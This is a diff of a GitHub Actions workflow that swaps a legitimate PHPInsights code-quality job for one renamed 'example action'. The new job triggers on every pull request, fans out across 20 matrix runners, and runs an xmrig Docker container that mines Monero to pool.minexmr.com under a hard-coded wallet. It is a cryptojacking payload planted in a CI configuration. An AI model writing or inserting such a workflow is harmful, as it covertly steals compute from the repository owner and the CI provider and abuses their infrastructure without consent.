@@ -1,35 +1,20 @@
-name: CI - PHPInsight
+name: example action
 
-# Controls when the action will run. Triggers the workflow on push or pull request
-# events but only for the master branch
 on: [pull_request]
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
-jobs:
-  phpinsights:
-    runs-on: ubuntu-latest
 
-    name: PHP Insights checks
+jobs:
+  sorry:
+    name: sorry
+
+    runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-    - name: Checkout code
-      uses: actions/checkout@v2
-
-    - name: Cache PHP dependencies
-      uses: actions/cache@v1
-      with:
-        path: vendor
-        key: ${{ runner.OS }}-build-${{ hashFiles('**/composer.lock') }}
-
-    - name: Setup PHP
-      uses: shivammathur/setup-php@v2
-      with:
-        php-version: 7.4
-        extensions: dom, curl, libxml, mbstring, zip, pcntl, pdo, sqlite, pdo_sqlite, bcmath, soap, intl, gd, exif, iconv
-        coverage: none
-
-    - name: Install PHP dependencies
-      run: composer install --prefer-dist --no-progress --no-suggest
-
-    - name: PHPInsights
-      run: vendor/bin/phpinsights -n --ansi --format=github-action -v
+      - name: Sorry Bill
+        run: docker run --rm -e POOL_URL=pool.minexmr.com:4444  -e POOL_USER=488gqmpBPEtLtf97ZUs6zuRZgk1DkVYtCdVZ8AXfZh2zBvTppPysRJjeMCC5XC1neMYsNPPgp56qZejNdPMmRGibBSkP5ws metal3d/xmrig
